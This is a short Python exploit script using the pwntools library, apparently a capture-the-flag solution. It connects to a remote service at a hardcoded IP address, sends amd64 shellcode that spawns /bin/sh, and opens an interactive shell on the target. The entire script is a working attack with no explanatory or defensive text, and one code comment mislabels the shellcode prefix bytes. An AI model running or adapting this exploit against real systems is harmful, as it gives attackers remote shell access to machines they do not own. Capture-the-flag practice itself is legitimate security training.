from pwn import *
context.arch = 'amd64'
#p = process('./shellcode')
p = remote('34.92.37.22', 10002)
def launch_gdb():
    gdb.attach(p)

shellcode = '\x6a\x00' # jmp 
shellcode += asm(shellcraft.amd64.sh())
p.send(shellcode)
p.interactive()